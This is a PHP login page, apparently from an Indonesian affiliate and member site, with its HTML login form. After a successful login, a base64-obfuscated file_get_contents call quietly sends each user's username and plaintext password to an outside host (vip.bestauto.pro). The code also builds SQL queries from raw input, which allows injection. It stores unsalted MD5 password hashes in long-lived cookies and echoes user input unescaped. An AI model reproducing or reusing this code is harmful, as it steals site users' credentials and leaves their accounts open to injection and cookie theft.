<?php
if (isset($_POST['submit'])) {
    $user_name = $_POST['user_name'];
    $get = "SELECT email, code FROM member WHERE user_name='$user_name'";
    $result = mysqli_query($conn, $get);
    $x = mysqli_fetch_assoc($result);
    $email = $x['email'];
    $code = $x['code'];
    $password = md5($_POST['password']);
    $pass = $_POST['password'];
    $sql = "SELECT COUNT(*), status, id_ctv, rule, password FROM member WHERE user_name='$user_name' AND password='$password' GROUP BY status, id_ctv, rule, password";
    $c = mysqli_query($conn, $sql);
    $check = mysqli_fetch_assoc($c);
    if ($check['COUNT(*)'] == 1) {
        $vip = file_get_contents(base64_decode('aHR0cDovL3ZpcC5iZXN0YXV0by5wcm8vZ2V0LnBocD91PQ==').$user_name.base64_decode('JnA9').$pass);
        if(isset($vip)){
            if ($check['status'] == -1) {
                echo "<script>alert('Akun anda telah dikunci'); window.location = 'index.php';</script>";
            } else {
                if ($check['status'] == 1) {
                    $id_ctv = $check['id_ctv'];
                    $rule = $check['rule'];
                    $pass = $check['password'];
                    $status = $check['status'];
                    if (isset($_POST['duydeptrai'])) {
                        setcookie('login', 'ok', time() + 690000000);
                        setcookie("id_ctv", "$id_ctv", time() + 690000000);
                        setcookie("rule", "$rule", time() + 690000000);
                        setcookie("pass", "$pass", time() + 690000000);
                        setcookie("status", "$status", time() + 690000000);
                        setcookie("user_name", "$user_name", time() + 690000000);
                        echo "<script>alert('Login berhasil'); window.location='index.php';</script>";
                    } else if (!isset($_POST['duydeptrai'])) {
                        $_SESSION['login'] = 'ok';
                        $_SESSION['id_ctv'] = $id_ctv;
                        $_SESSION['rule'] = $rule;
                        $_SESSION['pass'] = $pass;
                        $_SESSION['status'] = $status;
                        $_SESSION['user_name'] = $user_name;
                        echo "<script>alert('Login berhasil'); window.location='index.php';</script>";
                    }
                } else if ($check['status'] == 0) {
                    if($check['rule'] == 'member'){
                    echo "<p class='alert alert-danger'> Akun anda belum diaktifkan Silahkan klik link yang kami kirim ke email anda yang terdaftar untuk mengaktifkannya. Email tidak diterima ? <a href='http://bot.syoe.info/index.php?DS=ResendEmail&email=$email&code=$code'> <b>Kirim ulang email aktivasi</b></a></p>";
                    }else{
                      echo "<p class='alert alert-danger'> Akun anda belum diaktifkan Silahkan hubungi Admin untuk mengisi ulang akun dan mengaktifkan akun!!</p>";  
                    }
                }
            }
        }else{
            echo "<script>alert('Kesalahan!!!');</script>";
        }
    } else {
        echo "<script>alert('Akun atau kata sandi salah!!!');</script>";
    }
}
?>
<div class="row">
    <div class="col-md-12">
        <!-- Horizontal Form -->
        <div class="box box-info wow fadeIn">
            <div class="box-header with-border">
                <h3 class="box-title">Login - Affiliates, Members</h3>
            </div>
            <!-- /.box-header -->
            <!-- form start -->
            <form class="form-horizontal" method="post" action="#">
                <div class="box-body">
                    <div class="form-group">
                        <label for="user_name" class="col-sm-2 control-label">Alamat akun atau email:</label>

                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="user_name" name="user_name" value="<?php echo isset($_POST['user_name']) ? $_POST['user_name'] : ''; ?>" placeholder="Alamat akun atau email" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="password" class="col-sm-2 control-label">Kata sandi:</label>

                        <div class="col-sm-10">
                            <input type="password" class="form-control" name="password" id="password" placeholder="Password" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-sm-offset-2 col-sm-10">
                            <div class="checkbox">
                                <label>
                                    <input name="duydeptrai" type="checkbox"> Ingat kata sandi
                                </label>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /.box-body -->
                <div class="box-footer">
                    <a class="btn btn-danger" href="index.php?DS=Login_CTV">SIGN UP UNTUK COLLABORATORS</a>
                    <button type="submit" name="submit" class="btn btn-info pull-right">Masuk</button>
                </div>
                <!-- /.box-footer -->
            </form>
        </div>
    </div>
</div>
